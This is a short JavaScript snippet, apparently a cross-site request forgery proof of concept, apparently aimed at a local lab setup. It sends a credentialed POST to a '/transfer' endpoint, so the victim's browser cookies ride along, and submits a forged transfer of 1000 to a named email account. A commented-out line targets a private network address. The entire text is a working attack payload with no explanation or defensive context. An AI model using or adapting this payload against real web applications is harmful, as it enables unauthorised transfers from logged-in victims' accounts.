var xhr = new XMLHttpRequest();
// xhr.open("POST", "https://192.168.2.199:58524/transfer");
xhr.open("POST", "https://127.0.0.1:8080/transfer");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("user_to=hi%40gmail.com&amount=1000");
